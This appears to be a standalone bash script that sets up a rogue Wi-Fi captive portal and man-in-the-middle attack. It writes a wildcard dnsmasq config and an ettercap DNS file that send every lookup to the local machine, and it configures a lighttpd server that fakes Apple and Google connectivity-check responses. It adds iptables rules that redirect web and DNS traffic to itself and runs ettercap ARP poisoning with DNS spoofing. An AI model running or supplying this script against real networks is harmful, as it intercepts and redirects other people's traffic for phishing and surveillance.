#!/bin/bash
interface="wlan0"
workingpath=$(pwd)
etterpath=/ettercap
ssl=false
ipg=`ip addr show | grep wlan0 | grep -o inet.* | cut -d'/' -f1 | cut -d ' ' -f2` ;
ipr=`ip addr show | grep wlan0 | grep -o inet.* | cut -d ' ' -f2`
ipb=`ip addr show | grep wlan0 | grep -o inet.* | cut -d'/' -f1 | cut -d ' ' -f2|cut -d'.' -f1,2,3`
killall dnsmasq
killall dhcpd
killall apache2
killall hostapd
killall dnsspoof
killall lighttpd
killall isc-dhcp-server
echo "* A $ipg" > $etterpath/share/etter.dns
##define colors
# Bold-text+colors
BBlack='\e[1;30m'       # Black
BRed='\e[1;31m'         # Red
BGreen='\e[1;32m'       # Green
BYellow='\e[1;33m'      # Yellow
BBlue='\e[1;34m'        # Blue
BPurple='\e[1;35m'      # Purple
BCyan='\e[1;36m'        # Cyan
BWhite='\e[1;37m'       # White

# Regular Colors

Black='\e[0;30m'        # Black
Red='\e[0;31m'          # Red
Green='\e[0;32m'        # Green
Yellow='\e[0;33m'       # Yellow
Blue='\e[0;34m'         # Blue
Purple='\e[0;35m'       # Purple
Cyan='\e[0;36m'         # Cyan
White='\e[0;37m'        # White

echo "\
no-resolv
interface=$interface
dhcp-range=$ipb.2,$ipb.255,12h
address=/google.com/172.217.5.78
address=/connectivitycheck.gstatic.com/172.217.168.163
address=/clients3.google.com/172.217.11.174
address=/captive.apple.com/17.253.109.201
address=/connectivitycheck.android.com/172.217.17.14
address=/gstatic.com/216.58.214.163
address=/www.apple.com/104.121.11.119
address=/msftconnecttest.com/104.215.95.187
address=/#/$ipg
log-queries
log-dhcp
" >dnsmasq.conf
echo "\
server.document-root = \"$workingpath/server/\"

server.modules = (
	\"mod_access\",
	\"mod_alias\",
	\"mod_accesslog\",
	\"mod_redirect\",
	\"mod_rewrite\"
)

accesslog.filename = \"$workingpath/lighttpd.log\"


server.port = 80
server.pid-file = \"/var/run/lighttpd.pid\"
# server.username = \"www\"
# server.groupname = \"www\"

mimetype.assign = (
	\".html\" => \"text/html\",
	\".htm\" => \"text/html\",
	\".txt\" => \"text/plain\",
	\".jpg\" => \"image/jpeg\",
	\".png\" => \"image/png\",
	\".css\" => \"text/css\"
)


server.error-handler-404 = \"/\"

static-file.exclude-extensions = (
	\".fcgi\",
	\".php\",
	\".rb\",
	\"~\",
	\".inc\"
)

index-file.names = (
	\"index.htm\",
	\"index.html\",
    \"index.php\"
)
" >"lighttpd.conf"

  if [ "$ssl" = true ]; then
    echo "\
\$SERVER[\"socket\"] == \":443\" {
	ssl.engine = \"enable\"
	ssl.pemfile = \"server.pem\"
}
" >>"lighttpd.conf"

fi
echo "\
\$HTTP[\"host\"] == \"captive.apple.com\" { # Respond with Apple's captive response.
	server.document-root = \"$workingpath/server/connectivity_responses/Apple/\"
}


\$HTTP[\"host\"] =~ \"((www|(android\.)?clients[0-9]*|(alt[0-9]*-)?mtalk)\.google|connectivitycheck\.(android|gstatic))\.com\" {
	server.document-root = \"$workingpath/server/connectivity_responses/Google/\"
	url.rewrite-once = ( \"^/generate_204\$\" => \"generate_204.php\" )
}
" >>"lighttpd.conf"

 

service isc-dhcp-server stop
echo 1 >/proc/sys/net/ipv4/ip_forward

ifconfig $interface up  $ipg netmask 255.255.255.0
route add -net $ipb.0 netmask 255.255.255.0 gw  $ipg

	iptables --flush
	iptables --table nat --flush
	iptables --delete-chain
	iptables --table nat --delete-chain
	iptables -P FORWARD ACCEPT
	iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $ipg:80
	iptables -t nat -A PREROUTING -p tcp --dport 53 -j DNAT --to-destination $ipg:53
	iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to-destination $ipg:53
	iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination $ipg:443
	iptables -t nat -A POSTROUTING -j MASQUERADE
	iptables --table nat --append POSTROUTING --out-interface $interface -j ACCEPT
sleep 1

 dnsmasq -C $workingpath/dnsmasq.conf -d    & PID2=$!
 lighttpd -f  lighttpd.conf   & PID3=$!
  ./$etterpath/ettercap -Tqi wlan0 -M arp:remote -P dns_spoof  & PID1=$!
echo 1 >/proc/sys/net/ipv4/ip_forward




wait $PID1 $PID2 $PID3 $PID4 $PID5





